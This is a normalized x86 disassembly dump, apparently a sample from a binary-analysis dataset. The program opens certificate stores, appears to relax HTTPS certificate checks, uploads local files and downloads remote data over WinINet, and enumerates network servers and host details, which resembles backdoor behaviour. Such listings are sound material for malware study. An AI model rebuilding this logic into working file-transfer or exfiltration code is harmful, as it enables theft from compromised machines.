mov [ esi + 0x8 ] ebx
pop edi
pop esi
pop ebx
retn
push eax
call edi
mov [ esi ] ebx
sub_407fb0
sub esp 0x8
push ebx
push ebp
push esi
mov esi ecx
push edi
mov [ esp + 0x14 ] esi
mov eax [ esi + 0x3c ]
cmp eax 0x4
ja r-xdata
mov eax [ esp + 0x10 ]
push eax
push 0x0
call [ CertOpenSystemStoreA@IAT ]
test eax eax
mov [ esi + 0x34 ] eax
jne r-xdata
jmp [ eax * 4 + jump_table_408220 ]
mov ecx esi
call sub_408240
test eax eax
mov [ esi + 0x38 ] eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea ebx [ esi + 0x80 ]
mov ebp ecx
push 0x1
push ebp
mov ecx ebx
call sub_406500
test al al
je r-xdata
mov [ esp + 0x10 ] rw-data
jmp r-xdata
mov [ esp + 0x10 ] rw-data
jmp r-xdata
mov [ esp + 0x10 ] rw-data
jmp r-xdata
mov [ esp + 0x10 ] rw-data
mov ecx [ esi + 0x4 ]
push 0x14
push eax
push 0x54
push ecx
call [ InternetSetOptionA@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea ebx [ esi + 0x80 ]
mov ebp ecx
push 0x1
push ebp
mov ecx ebx
call sub_406500
test al al
je r-xdata
mov edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
mov edx [ ebx + 0x8 ]
[ edi ]
not ecx
dec ecx
mov edi ecx
mov ecx [ r--data ]
sub ecx edx
cmp ecx edi
ja r-xdata
mov edi [ ebx + 0x4 ]
mov ecx ebp
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x4 ]
mov esi [ esp + 0x14 ]
mov [ ebx + 0x8 ] ebp
mov [ eax + ebp ] 0x0
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
add esp 0x8
retn
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea ebx [ esi + 0x80 ]
mov ebp ecx
cmp ebp 0xfffffffd
jbe r-xdata
call [ GetLastError@IAT ]
mov ecx esi
mov [ esi + 0x2090 ] eax
call sub_407f50
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0x8
retn
mov edi [ ebx + 0x4 ]
mov ecx ebp
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x4 ]
mov esi [ esp + 0x14 ]
mov [ ebx + 0x8 ] ebp
mov [ eax + ebp ] 0x0
test edi edi
jbe r-xdata
call sub_408c16
mov ecx [ ebx + 0x4 ]
test ecx ecx
je r-xdata
call sub_408c16
call [ GetLastError@IAT ]
mov ecx esi
mov [ esi + 0x2090 ] eax
call sub_407f50
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0x8
retn
mov ebp [ ebx + 0x8 ]
push 0x0
add ebp edi
mov ecx ebx
push ebp
call sub_406500
test al al
je r-xdata
test ebp ebp
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov esi [ esp + 0x14 ]
mov edx [ ebx + 0x4 ]
mov esi [ esp + 0x10 ]
mov ecx edi
mov edi [ ebx + 0x8 ]
add edi edx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x8 ] ebp
mov [ eax + ebp ] 0x0
mov eax [ ebx + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx ebx
call sub_4063b0
jmp r-xdata
cmp al 0xff
je r-xdata
push 0x1
mov ecx ebx
call sub_4063b0
cmp eax ebp
jae r-xdata
call [ GetLastError@IAT ]
mov ecx esi
mov [ esi + 0x2090 ] eax
call sub_407f50
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0x8
retn
test ebp ebp
jne r-xdata
mov edi [ ebx + 0x4 ]
mov ecx ebp
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x4 ]
mov esi [ esp + 0x14 ]
mov [ ebx + 0x8 ] ebp
mov [ eax + ebp ] 0x0
push ebp
mov ecx ebx
call sub_406630
dec al
push ebp
mov [ ecx - 0x1 ] al
mov ecx ebx
call sub_4063b0
jmp r-xdata
sub_408240
sub esp 0x8
push esi
push edi
mov esi ecx
push 0x10
mov [ esp + 0xc ] 0x1
call ??2@YAPAXI@Z
mov [ esp + 0x10 ] eax
mov [ eax ] rw-data
mov eax [ esp + 0x10 ]
add esp 0x4
mov [ eax + 0x4 ] 0x0
mov eax [ esi + 0x74 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0xc ]
mov [ ecx + 0xc ] eax
mov eax [ esi + 0x74 ]
test eax eax
jne r-xdata
mov eax r--data
mov edi eax
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0xc ]
[ edi ]
not ecx
push eax
lea eax [ esp + 0xc ]
dec ecx
push eax
mov [ edx + 0x8 ] ecx
mov ecx [ esi + 0x34 ]
push 0x30004
push 0x0
push 0x10001
push ecx
call [ CertFindCertificateInStore@IAT ]
mov edx [ esp + 0xc ]
mov esi eax
push edx
call ??3@YAXPAX@Z
add esp 0x4
mov eax esi
pop edi
pop esi
add esp 0x8
retn
mov eax r--data
sub_4082e0
push 0xffffffff
push sub_40910b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x420
mov al [ esp + 0x3 ]
push ebx
push ebp
xor ebx ebx
push esi
push edi
mov [ esp + 0x2c ] ecx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x14 ] al
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x438 ] ebx
cmp esi ebx
jbe r-xdata
call sub_408c16
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x30 ]
[ edi ]
cmp [ esp + 0x28 ] ebx
je r-xdata
mov ecx [ esp + 0x1c ]
push ebx
lea ebp [ ecx + esi ]
lea ecx [ esp + 0x18 ]
push ebp
call sub_406500
test al al
je r-xdata
mov esi [ esp + 0x440 ]
mov cl [ esp + 0x14 ]
lea eax [ esp + 0x14 ]
mov [ esi ] cl
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov edx [ r--data ]
mov ecx esi
push edx
push ebx
push eax
call sub_406120
mov ecx [ esp + 0x18 ]
cmp ecx ebx
je r-xdata
cmp [ esp + 0x24 ] ebx
ja r-xdata
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
mov ecx esi
lea esi [ esp + 0x30 ]
lea edi [ eax + edx ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x18 ]
mov [ esp + 0x1c ] ebp
mov [ eax + ebp ] bl
mov ecx [ esp + 0x430 ]
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x42c
retn 0x4
mov al [ ecx - 0x1 ]
cmp al bl
je r-xdata
mov eax [ esp + 0x2c ]
lea ecx [ esp + 0x24 ]
push ecx
lea edx [ esp + 0x34 ]
mov ecx [ eax + 0x4 ]
push 0x3ff
push edx
push ecx
call [ InternetReadFile@IAT ]
mov edx [ esp + 0x24 ]
mov [ esp + 0x28 ] eax
lea edi [ esp + 0x30 ]
or ecx 0xffffffff
xor eax eax
mov [ esp + edx + 0x30 ] bl
[ edi ]
mov eax [ r--data ]
mov edx [ esp + 0x1c ]
not ecx
dec ecx
sub eax edx
mov esi ecx
cmp eax esi
ja r-xdata
dec ecx
push ecx
call ??3@YAXPAX@Z
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
sub_408440
mov eax 0x2008
call sub_4089e0
push ebx
push ebp
push esi
mov ebp ecx
push edi
mov ecx 0x800
mov edx [ ebp + 0x4 ]
xor eax eax
lea edi [ esp + 0x18 ]
mov [ esp + 0x14 ] 0x0
[ edi ]
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
push eax
push 0x2000
push ecx
push edx
call [ InternetReadFile@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0x2008
retn 0x4
mov ecx 0x5
mov edi rw-data
lea esi [ esp + 0x18 ]
xor eax eax
[ esi ] [ edi ]
je r-xdata
mov edx [ esp + 0x10 ]
test edx edx
jbe r-xdata
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x18 ]
test ebx ebx
[ edi ]
je r-xdata
lea ecx [ esp + 0x14 ]
push eax
mov eax [ esp + 0x2020 ]
push ecx
push edx
lea edx [ esp + 0x24 ]
push edx
push eax
call [ WriteFile@IAT ]
mov edx [ esp + 0x10 ]
cmp ebx 0xa
jne r-xdata
test edx edx
jbe r-xdata
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
add esp 0x2008
retn 0x4
mov eax [ ebp + 0x4 ]
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0x1c ]
push 0x2000
push edx
push eax
call [ InternetReadFile@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0x2008
retn 0x4
sub_408530
mov eax 0x2240
call sub_4089e0
push ebx
push ebp
push esi
mov esi ecx
lea eax [ esp + 0x1c ]
push edi
mov edx [ esi + 0x4 ]
lea ecx [ esp + 0x18 ]
push eax
push ecx
xor ebx ebx
push 0x1f
push edx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x34 ] ebx
xor ebp ebp
mov [ esp + 0x30 ] 0x4
call [ InternetQueryOptionA@IAT ]
mov edi [ esp + 0x18 ]
mov ecx [ esi + 0x4 ]
lea eax [ esp + 0x18 ]
or edi 0x4000100
push 0x4
push eax
mov [ esp + 0x20 ] edi
mov edi [ InternetSetOptionA@IAT ]
push 0x1f
push ecx
call edi
mov eax [ esi + 0x4 ]
lea edx [ esp + 0x10 ]
push 0x4
push edx
push 0x2
push eax
mov [ esp + 0x20 ] 0x6ddd00
call edi
mov edx [ esi + 0x4 ]
lea ecx [ esp + 0x10 ]
push 0x4
push ecx
push 0x6
push edx
call edi
mov ecx [ esi + 0x4 ]
lea eax [ esp + 0x10 ]
push 0x4
push eax
push 0x5
push ecx
call edi
mov eax [ esi + 0x4 ]
lea edx [ esp + 0x10 ]
push 0x4
push edx
push 0x7
push eax
call edi
mov edx [ esi + 0x4 ]
lea ecx [ esp + 0x10 ]
push 0x4
push ecx
push 0x8
push edx
call edi
mov eax [ esp + 0x225c ]
mov ecx [ esp + 0x2258 ]
push eax
push ecx
push rw-data
lea edx [ esp + 0x5c ]
push rw-data
push edx
call sprintf
add esp 0x14
mov ecx 0x9
xor eax eax
lea edi [ esp + 0x2c ]
[ edi ]
lea eax [ esp + 0x50 ]
lea edi [ esp + 0x50 ]
mov [ esp + 0x30 ] eax
or ecx 0xffffffff
xor eax eax
push ebx
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x54 ]
mov [ esp + 0x38 ] ecx
or ecx 0xffffffff
[ edi ]
mov eax [ esi + 0x4 ]
push ebx
not ecx
dec ecx
lea edx [ esp + 0x30 ]
mov [ esp + 0x40 ] ecx
mov ecx [ esp + 0x2260 ]
push ebx
push edx
push eax
mov [ esp + 0x3c ] 0x28
mov [ esp + 0x40 ] ebx
mov [ esp + 0x50 ] ebx
mov [ esp + 0x54 ] ebx
mov [ esp + 0x58 ] ecx
mov [ esp + 0x5c ] ebx
mov [ esp + 0x60 ] ebx
call [ HttpSendRequestExA@IAT ]
test eax eax
jne r-xdata
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x250 ]
push ebx
[ edi ]
mov edi [ esp + 0x2258 ]
lea ecx [ esp + 0x18 ]
push ecx
lea edx [ esp + 0x258 ]
push 0x2000
push edx
push edi
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov ecx esi
call sub_407f50
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0x2240
retn 0xc
mov edi 0xa
jmp r-xdata
mov ecx [ esp + 0x14 ]
lea eax [ esp + 0x1c ]
push eax
mov eax [ esi + 0x4 ]
lea edx [ esp + 0x254 ]
push ecx
push edx
push eax
call [ InternetWriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
push ebx
push ebx
push ebx
push eax
call [ HttpEndRequestA@IAT ]
test eax eax
jne r-xdata
mov edi [ esp + 0x24 ]
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x2258 ]
add ebp edx
xor eax eax
cmp ebp ecx
jne r-xdata
cmp edi 0xa
pop edi
pop esi
pop ebp
setne al
pop ebx
add esp 0x2240
retn 0xc
mov ecx esi
call sub_407f50
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0x2240
retn 0xc
cmp [ esp + 0x14 ] ebx
je r-xdata
cmp eax [ esp + 0x225c ]
je r-xdata
lea ecx [ esp + 0x14 ]
push ebx
push ecx
lea edx [ esp + 0x258 ]
push 0x2000
push edx
push edi
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
sub_408770
mov eax 0x1034
call sub_4089e0
push ebx
push ebp
push esi
mov [ esp + 0xc ] ecx
push edi
mov ecx 0x9
xor eax eax
lea edi [ esp + 0x1c ]
mov ebp [ esp + 0x1048 ]
xor edx edx
[ edi ]
mov ecx 0x400
lea edi [ esp + 0x40 ]
mov ebx [ esp + 0x1054 ]
push edx
[ edi ]
mov eax [ esp + 0x1050 ]
mov ecx [ esp + 0x105c ]
push edx
mov [ esp + 0x1c ] edx
mov [ esp + 0x24 ] edx
mov [ esp + 0x34 ] edx
mov [ esp + 0x38 ] edx
mov [ esp + 0x40 ] edx
mov [ esp + 0x44 ] edx
push edx
lea edx [ esp + 0x24 ]
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x105c ]
push edx
push ebp
xor esi esi
mov [ esp + 0x2c ] 0x28
mov [ esp + 0x38 ] eax
mov [ esp + 0x3c ] eax
mov [ esp + 0x48 ] ecx
call [ HttpSendRequestExA@IAT ]
test eax eax
jne r-xdata
push 0x1000
lea eax [ esp + 0x44 ]
push ebx
push eax
call strncpy
add esp 0xc
lea ecx [ esp + 0x14 ]
lea edi [ esp + 0x40 ]
xor eax eax
push ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edx [ esp + 0x44 ]
push ecx
push edx
push ebp
call [ InternetWriteFile@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
call sub_407f50
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0x1034
retn 0x14
mov ecx [ esp + 0x10 ]
call sub_407f50
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0x1034
retn 0x14
mov eax [ esp + 0x14 ]
add esi eax
add ebx eax
cmp esi [ esp + 0x1058 ]
jae r-xdata
mov esi [ esp + 0x1054 ]
mov ecx 0x5
mov edi rw-data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
push 0x1000
lea eax [ esp + 0x44 ]
push ebx
push eax
call strncpy
add esp 0xc
lea ecx [ esp + 0x14 ]
lea edi [ esp + 0x40 ]
xor eax eax
push ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edx [ esp + 0x44 ]
push ecx
push edx
push ebp
call [ InternetWriteFile@IAT ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push 0x0
push ebp
call [ HttpEndRequestA@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x10 ]
call sub_407f50
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0x1034
retn 0x14
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
add esp 0x1034
retn 0x14
mov ecx [ esp + 0x10 ]
call sub_407f50
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0x1034
retn 0x14
sub_4089e0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_408c0f
cmp [ rw-data ] ebx
jne r-xdata
call sub_408bfa
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_408c0c
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401070
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_408c16
mov eax sub_409120
call _EH_prolog
sub esp 0x30
mov al [ ebp - 0xd ]
push esi
push 0x0
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] al
call sub_4063b0
mov esi r--data
push esi
call strlen
pop ecx
push eax
push esi
lea ecx [ ebp - 0x20 ]
call sub_406440
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x3c ]
call sub_408c70
lea eax [ ebp - 0x3c ]
push r--data
push eax
mov [ ebp - 0x3c ] r--data
call _CxxThrowException
sub_408c70
mov eax sub_409134
call _EH_prolog
push ecx
push ecx
push ebx
push esi
lea eax [ ebp - 0x10 ]
push edi
mov esi ecx
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] rw-data
call ??0exception@@QAE@ABQBD@Z
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xc ]
push 0x0
mov al [ ebx ]
mov ecx edi
mov [ edi ] al
call sub_4063b0
push [ r--data ]
mov ecx edi
push 0x0
push ebx
call sub_406120
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_408cfe
mov eax sub_409148
call _EH_prolog
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_4063b0
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call ??1exception@@UAE@XZ
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_408d57
mov eax sub_40915c
call _EH_prolog
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
push ebx
mov [ ebp - 0x10 ] esi
call ??0exception@@QAE@ABV0@@Z
mov al [ ebx + 0xc ]
and [ ebp - 0x4 ] 0x0
add ebx 0xc
lea edi [ esi + 0xc ]
push 0x0
mov ecx edi
mov [ edi ] al
call sub_4063b0
push [ r--data ]
mov ecx edi
push 0x0
push ebx
call sub_406120
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_408db4
mov eax sub_409170
call _EH_prolog
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_4063b0
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call ??1exception@@UAE@XZ
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_408e42
mov eax sub_409184
call _EH_prolog
sub esp 0x30
mov al [ ebp - 0xd ]
push esi
push 0x0
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] al
call sub_4063b0
mov esi r--data
push esi
call strlen
pop ecx
push eax
push esi
lea ecx [ ebp - 0x20 ]
call sub_406440
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x3c ]
call sub_408c70
lea eax [ ebp - 0x3c ]
push r--data
push eax
mov [ ebp - 0x3c ] r--data
call _CxxThrowException
sub_408e9c
mov eax sub_409198
call _EH_prolog
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_4063b0
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call ??1exception@@UAE@XZ
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_406400
call sub_406410
jmp sub_406420
sub_406410
mov ecx rw-data
jmp sub_407720
sub_406420
push sub_406430
call sub_408a66
pop ecx
retn
sub_406430
mov ecx rw-data
jmp sub_407850
sub_4064e0
mov eax [ esp + 0x4 ]
mov [ ecx + 0x8 ] eax
mov ecx [ ecx + 0x4 ]
mov [ ecx + eax ] 0x0
retn 0x4
sub_406620
mov eax 0xfffffffd
retn
sub_406689
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
add eax 0x2
test eax eax
jge r-xdata
push eax
call ??2@YAPAXI@Z
mov [ ebp + 0x8 ] eax
add esp 0x4
mov eax r-xdata
retn
xor eax eax
sub_406810
mov cl [ rw-data ]
mov al 0x1
test al cl
jne r-xdata
jmp sub_406830
or cl al
mov [ rw-data ] cl
sub_406830
push sub_406840
call sub_408a66
pop ecx
retn
sub_406840
retn
sub_407050
mov eax ecx
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
retn
sub_407060
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
push 0x0
call free
pop ecx
sub_4072d0
push esi
mov esi ecx
cmp [ esi ] 0x0
jne r-xdata
pop esi
retn
push rw-data
push rw-data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ esi ] eax
sub_408920
mov cl [ rw-data ]
mov al 0x1
test al cl
jne r-xdata
jmp sub_408940
or cl al
mov [ rw-data ] cl
sub_408940
push sub_406840
call sub_408a66
pop ecx
retn
GetSystemPowerStatus
jmp [ GetSystemPowerStatus@IAT ]
NetApiBufferFree
jmp [ NetApiBufferFree@IAT ]
NetServerEnum
jmp [ NetServerEnum@IAT ]
inet_ntoa
jmp [ inet_ntoa@IAT ]
gethostbyname
jmp [ gethostbyname@IAT ]
gethostname
jmp [ gethostname@IAT ]
WSACleanup
jmp [ WSACleanup@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
atoi
jmp [ atoi@IAT ]
memchr
jmp [ memchr@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
free
jmp [ free@IAT ]
malloc
jmp [ malloc@IAT ]
fclose
jmp [ fclose@IAT ]
fwrite
jmp [ fwrite@IAT ]
fopen
jmp [ fopen@IAT ]
atof
jmp [ atof@IAT ]
sprintf
jmp [ sprintf@IAT ]
strncpy
jmp [ strncpy@IAT ]
rand
jmp [ rand@IAT ]
srand
jmp [ srand@IAT ]
time
jmp [ time@IAT ]
_ftol
jmp [ _ftol@IAT ]
islower
jmp [ islower@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_atoi64
jmp [ _atoi64@IAT ]
fwprintf
jmp [ fwprintf@IAT ]
fprintf
jmp [ fprintf@IAT ]
memmove
jmp [ memmove@IAT ]
sub_408a3a
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_408a66
push [ esp + 0x4 ]
call sub_408a3a
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
??2@YAPAXI@Z
jmp [ operator new@IAT ]
realloc
jmp [ realloc@IAT ]
_except_handler3
jmp [ _except_handler3@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_408bfa
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_408c0c
xor eax eax
retn
sub_408c0f
retn
_controlfp
jmp [ _controlfp@IAT ]
sub_408cd4
mov eax [ ecx + 0x10 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_408ce1
push ebp
mov ebp esp
sub esp 0x1c
push ecx
lea ecx [ ebp - 0x1c ]
call sub_408d57
lea eax [ ebp - 0x1c ]
push r--data
push eax
call _CxxThrowException
sub_408d3b
push esi
mov esi ecx
call sub_408cfe
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
pop ecx
sub_408df1
push ebp
mov ebp esp
sub esp 0x1c
push ecx
lea ecx [ ebp - 0x1c ]
call sub_408e2a
lea eax [ ebp - 0x1c ]
push r--data
push eax
call _CxxThrowException
sub_408e0e
push esi
mov esi ecx
call sub_408db4
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
pop ecx
sub_408e2a
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_408d57
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_408ed9
push ebp
mov ebp esp
sub esp 0x1c
push ecx
lea ecx [ ebp - 0x1c ]
call sub_408f12
lea eax [ ebp - 0x1c ]
push r--data
push eax
call _CxxThrowException
sub_408ef6
push esi
mov esi ecx
call sub_408e9c
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
pop ecx
sub_408f12
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_408d57
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_408f2a
test [ rw-data ] 0x1
jne r-xdata
call sub_408f54
test [ rw-data ] 0x1
jne r-xdata
or [ rw-data ] 0x1
jmp sub_408f60
or [ rw-data ] 0x1
sub_408f54
push sub_406840
call sub_408a66
pop ecx
retn
sub_408f60
push sub_408f6c
call sub_408a66
pop ecx
retn
sub_408f6c
retn
??0exception@@QAE@ABV0@@Z
jmp [ exception::exception@IAT ]
sub_408f76
push esi
mov esi ecx
call ??1type_info@@UAE@XZ
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
pop ecx
strlen
jmp [ strlen@IAT ]
_EH_prolog
jmp [ _EH_prolog@IAT ]
_CxxThrowException
jmp [ _CxxThrowException@IAT ]
??1exception@@UAE@XZ
jmp [ exception::~exception@IAT ]
??0exception@@QAE@ABQBD@Z
jmp [ exception::exception@IAT ]
_wcsnicmp
jmp [ _wcsnicmp@IAT ]
??1type_info@@UAE@XZ
jmp [ type_info::~type_info@IAT ]
sub_408fc0
lea ecx [ ebp - 0x602c ]
jmp sub_4060e0
sub_408fcb
lea ecx [ ebp - 0x601c ]
jmp sub_4060e0
sub_408fd6
mov eax r--data
jmp __CxxFrameHandler
sub_408fe0
lea ecx [ ebp - 0x30 ]
jmp sub_4060e0
sub_408fe8
lea ecx [ ebp - 0x20 ]
jmp sub_4060e0
sub_408ff0
lea ecx [ ebp - 0x20 ]
jmp sub_4060e0
sub_408ff8
lea ecx [ ebp - 0x20 ]
jmp sub_4060e0
sub_409000
mov eax r--data
jmp __CxxFrameHandler
sub_409010
mov eax r--data
jmp __CxxFrameHandler
sub_409020
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_4060e0
sub_40902b
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_4060e0
sub_409036
mov ecx [ ebp - 0x10 ]
add ecx 0x40
jmp sub_4060e0
sub_409041
mov ecx [ ebp - 0x10 ]
add ecx 0x50
jmp sub_4060e0
sub_40904c
mov ecx [ ebp - 0x10 ]
add ecx 0x60
jmp sub_4060e0
